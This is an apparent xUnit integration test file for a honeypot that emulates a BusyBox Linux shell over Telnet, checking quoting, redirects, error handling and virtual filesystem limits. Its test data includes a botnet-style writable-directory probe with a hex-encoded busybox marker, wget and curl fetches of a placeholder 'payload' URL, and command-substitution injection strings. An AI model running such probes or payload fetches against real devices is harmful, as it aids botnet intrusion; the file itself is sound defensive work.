using Microsoft.Extensions.Options;
using TelemoqNet.Api.Configuration;
using TelemoqNet.Api.Emulation;
using Xunit;

namespace TelemoqNet.IntegrationTests;

public sealed class ShellEmulationTests
{
    private const string DirectoryProbe =
        """
        >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x43\x41\x49\x4f\x46\x53'
        """;

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public async Task Telnet_DirectoryProbe_ReturnsMarkerAndPersistsOriginalInput(bool useCrNul)
    {
        await using var fixture = await TelnetFixture.StartAsync();
        await using var client = await fixture.ConnectAsync();
        await client.LoginAsync();
        await client.SendLineAsync(DirectoryProbe, useCrNul);
        var response = await client.ReadUntilAsync("CAIOFS\r\n# ");
        Assert.EndsWith("CAIOFS\r\n# ", response);
        Assert.DoesNotContain("not found", response);
        Assert.DoesNotContain("syntax error", response);

        await client.SendLineAsync("pwd", useCrNul: true);
        await client.ReadUntilAsync("/var\r\n# ");
        await client.SendLineAsync("cat /var/.x && echo file-exists", useCrNul: true);
        await client.ReadUntilAsync("file-exists\r\n# ");
        await client.SendLineAsync("exit", useCrNul: true);
        var session = await fixture.WaitForSessionAsync();
        var entry = Assert.Single(session.Commands, entry => entry.Command == DirectoryProbe);
        Assert.EndsWith("\nCAIOFS", entry.Response);
        Assert.DoesNotContain(session.Events, entry => entry.Type == "payload.download_attempt");
    }

    [Theory]
    [InlineData("echo 'a ; && > b'", "a ; && > b")]
    [InlineData("echo one\" two\"' three'", "one two three")]
    [InlineData("echo a '' b", "a  b")]
    [InlineData(@"echo escaped\ space \; \& \>", "escaped space ; & >")]
    [InlineData(@"echo -e '\x43\x41\x49\x4f\x46\x53'", "CAIOFS")]
    [InlineData("/bin/busybox echo -e \"\\x43\\x41\\x49\\x4f\\x46\\x53\"", "CAIOFS")]
    [InlineData(@"echo -e '\x4a\012\t\\\q'", "J\n\t\\\\q")]
    [InlineData("echo -e -E '\\x43'", "\\x43")]
    [InlineData("echo '$(touch /tmp/expansion)'", "$(touch /tmp/expansion)")]
    public async Task Shell_PreservesQuotedWordsAndDecodesOnlyRequestedEchoEscapes(string command, string expected)
    {
        Assert.Equal("\r\n" + expected, await Device().ExecuteCommandAsync(command, CancellationToken.None));
    }

    [Theory]
    [InlineData("false")]
    [InlineData("busybox false")]
    [InlineData("unknown-command")]
    [InlineData("busybox unknown-applet")]
    [InlineData("cd /missing")]
    [InlineData("cat /missing")]
    [InlineData("ls /missing")]
    [InlineData("touch /tmp")]
    [InlineData("mkdir /tmp")]
    [InlineData("wget http://example.invalid/payload")]
    [InlineData("curl http://example.invalid/payload")]
    [InlineData(">/missing/.x")]
    [InlineData(">/tmp")]
    public async Task Shell_FailureSkipsAndChainButContinuesAfterSemicolon(string failingCommand)
    {
        var device = Device();
        var response = await device.ExecuteCommandAsync(
            $"{failingCommand}&&touch /tmp/skipped&&echo unexpected;echo continued", CancellationToken.None);

        Assert.EndsWith("continued", response);
        Assert.DoesNotContain("unexpected", response);
        Assert.Contains("No such file", await device.ExecuteCommandAsync("cat /tmp/skipped", CancellationToken.None));
    }

    [Fact]
    public async Task Shell_RedirectsTruncateAppendAndResolveAgainstWorkingDirectory()
    {
        var device = Device();
        var response = await device.ExecuteCommandAsync(
            "cd /tmp; echo old>note; >note&&echo new>>note; echo 'two words'>>note; cat note",
            CancellationToken.None);
        Assert.Equal("\r\nnew\ntwo words", response);
        Assert.Equal("/tmp", device.CurrentDirectory);
        Assert.Contains("No such file", await Device().ExecuteCommandAsync("cat /tmp/note", CancellationToken.None));

        Assert.Equal("\r\n", await device.ExecuteCommandAsync(
            "echo marker >first >second", CancellationToken.None));
        Assert.Equal("\r\n", await device.ExecuteCommandAsync("cat first", CancellationToken.None));
        Assert.Equal("\r\nmarker", await device.ExecuteCommandAsync("cat second", CancellationToken.None));
        Assert.Equal("\r\n", await device.ExecuteCommandAsync("echo ''>blank", CancellationToken.None));
        Assert.Equal("\r\n", await device.ExecuteCommandAsync("cat blank", CancellationToken.None));
        Assert.Equal("\r\n\nnext", await device.ExecuteCommandAsync("echo ''; echo next", CancellationToken.None));
    }

    [Theory]
    [InlineData(">/tmp/created; echo 'unfinished")]
    [InlineData(">/tmp/created; echo \"unfinished")]
    [InlineData(">/tmp/created &&")]
    [InlineData(">/tmp/created; echo hi >")]
    [InlineData(">/tmp/created; echo hi >>>out")]
    [InlineData(">/tmp/created;;echo hi")]
    [InlineData(">/tmp/created; echo hi | sh")]
    [InlineData(">/tmp/created; echo hi &")]
    [InlineData(">/tmp/created; echo hi 2>out")]
    [InlineData(">/tmp/created; echo $(touch /tmp/expanded)")]
    [InlineData(">/tmp/created; echo `touch /tmp/expanded`")]
    [InlineData(">/tmp/created; echo trailing\\")]
    public async Task Shell_RejectsMalformedOrUnsupportedSyntaxBeforeMutatingFiles(string command)
    {
        var device = Device();
        Assert.Contains("syntax error", await device.ExecuteCommandAsync(command, CancellationToken.None));
        Assert.Contains("No such file", await device.ExecuteCommandAsync("cat /tmp/created", CancellationToken.None));
    }

    [Fact]
    public async Task Shell_BoundsCommandCountAndCombinedOutput()
    {
        var device = Device(new HoneypotOptions { CommandLatencyMilliseconds = 0, MaxResponseLength = 16 });
        var response = await device.ExecuteCommandAsync(
            "echo 1234567890; echo abcdefghij; touch /tmp/after-output", CancellationToken.None);
        Assert.Equal("\r\n1234567890\nabcde\r\n[output truncated]", response);
        Assert.Equal("\r\n", await device.ExecuteCommandAsync("cat /tmp/after-output", CancellationToken.None));

        Assert.Contains("limit exceeded", await Device().ExecuteCommandAsync(
            string.Join(';', Enumerable.Repeat("true", 129)), CancellationToken.None));
    }

    [Fact]
    public async Task Shell_CancellationDuringLatencyPreventsFileChanges()
    {
        var options = new HoneypotOptions { CommandLatencyMilliseconds = 5000 };
        var device = Device(options);
        using var stop = new CancellationTokenSource();
        var command = device.ExecuteCommandAsync(">/tmp/cancelled", stop.Token);
        stop.Cancel();
        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => command);
        options.CommandLatencyMilliseconds = 0;
        Assert.Contains("No such file", await device.ExecuteCommandAsync("cat /tmp/cancelled", CancellationToken.None));
    }

    [Fact]
    public void VirtualWrites_RejectMissingParentsAndBoundFileGrowth()
    {
        var fileSystem = new VirtualFileSystem();
        fileSystem.Add(new VirtualFile("/", string.Empty, IsDirectory: true));
        Assert.False(fileSystem.Write("/missing/file", "value", append: false, out _));
        Assert.True(fileSystem.Write("/note", new string('x', 65536), append: false, out _));
        Assert.False(fileSystem.Append("/note", "x"));
        Assert.True(fileSystem.TryRead("/note", out var contents));
        Assert.Equal(65536, contents.Length);
        Assert.True(fileSystem.Write("/note", string.Empty, append: false, out _));
        Assert.True(fileSystem.Append("/note", "new"));
    }

    [Fact]
    public void VirtualWrites_BoundTotalContentsAndEntryCount()
    {
        var fileSystem = new VirtualFileSystem();
        fileSystem.Add(new VirtualFile("/", string.Empty, IsDirectory: true));
        for (var index = 0; index < 16; index++)
        {
            Assert.True(fileSystem.Write($"/file{index}", new string('x', 65536), append: false, out _));
        }

        Assert.False(fileSystem.Write("/overflow", "x", append: false, out _));
        Assert.True(fileSystem.Write("/file0", string.Empty, append: false, out _));
        Assert.True(fileSystem.Write("/overflow", "x", append: false, out _));

        var entries = new VirtualFileSystem();
        entries.Add(new VirtualFile("/", string.Empty, IsDirectory: true));
        for (var index = 0; index < 1023; index++)
        {
            Assert.True(entries.Write($"/file{index}", string.Empty, append: false, out _));
        }

        Assert.False(entries.Write("/overflow", string.Empty, append: false, out _));
    }

    private static GenericLinuxDevice Device(HoneypotOptions? options = null) =>
        new(Options.Create(options ?? new HoneypotOptions { CommandLatencyMilliseconds = 0 }));
}
